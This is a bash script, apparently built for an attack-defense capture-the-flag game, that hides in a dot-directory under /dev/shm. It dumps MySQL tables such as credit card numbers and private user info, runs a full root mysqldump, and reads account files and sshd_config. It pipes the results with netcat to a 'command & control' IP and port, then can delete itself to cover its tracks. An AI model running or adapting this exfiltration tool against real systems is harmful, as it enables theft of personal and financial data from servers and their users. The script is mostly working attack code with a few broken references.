#!/bin/bash
# downloads all the flags from exvery spot on a server
# command & control server
CATCHER=192.168.11.XXX
CP=1234
# time to quit
I=1
# obscure dir with obscure names
START=/dev/shm/
FILENEW=new_flags
FILEOLD=old_flags
INTEL=intel

STAMP=`date +%H-%M`

# cd into shm obscure
cd $START
HIDE=.drop

if [ ! -d $HIDE ]; then
	# if dir doesn't exist
	mkdir $HIDE
fi

cd $HIDE
DIR=$START$HIDE

touch $FILENEW

# amends flags
function amends {
mysql -B -e "use amends; select ccnum from pirates" >> $FILENEW
}

# therapy flags
function therapy {
mysql -B -e "use psycho; select private_info from users"  >> $FILENEW
}

# shakedown flags
function shakedown {
mysql -B -e "use shakedown; select content from protections_news" >> $FILENEW
}

# snitch flags
function snitch {
mysql -B -e "use snitch; select comment from black_book" >> $FILENEW
}

# copyright
function copyright {
cd /home/copyright/accounts
for i in $(ls); do cat $i; done >> $DIR/$FILENEW;
# back to dir
cd $DIR
}

# petition
function petition {
cat /home/petition/public_html/cgi-bin/signers.txt >> $FILENEW
}

function wouldyou {
# very careful this will erase previous flags from here!
# it sends the username twice
cd /home/wouldyou/public_html/db/
for i in $(ls); do echo -e "\r\n$i\n" | nc 127.0.0.1 9999; done >> $DIR/$FILENEW;
# back to dir
cd $DIR
}

function WHOLE_DATABASE {
        # BIG DATA DUMP
        mysqldump -uroot  --all-databases > $FILENEW
}

function send_to_server {
        #  feel free to add any file necessary to the arg
        for arg in "$*"
        do
                cat $arg | nc -q $I $CATCHER $CP
        done
}

function clean {
        for arg in "$*"
        do
        	rm -f $arg
        done
}

function old_new {
	mv $FILENEW $FILEOLD-$STAMP
	clean $FILENEW
}

function the_seven_kingdoms {
	amends
	therapy
	shakedown
	snitch
	copyright
	petition
	# careful; wouldyou erases all previous flags
	wouldyou

	# preferably send somewhere 
	#send...
	old_new
}

function give_Me {
	whoami > $INTEL
	id >> $INTEL
	cat /etc/ssh/sshd_config >> $INTEL

}

function kill_myself {
	cd $START
	rm -rf $HIDE
	rm -- $0
}

case "$1" in 
	-a) amends
	    old_new
	    ;;
    	-c) copyright
	    old_new
	    ;;
	-p) petition
	    old_new
	    ;;
	-n) snitch
	    old_new
	    ;;
	-h) shakedown
	    old_new
	    ;;
	-t) therapy
	    old_new
	    ;;
	-w) wouldyou
	    old_new
	    ;;
	-S) send_to_server $FILENEW
	    old_new
	    ;;
	-O) send_to_server $OLDFILE
	    old_new
	    ;;
	-P) find_me_SSH
	    old_new
	    ;;
	-K) kill_myself
	    ;;
	 *) the_seven_kingdoms
	    old_new
	    ;;
esac


exit 0
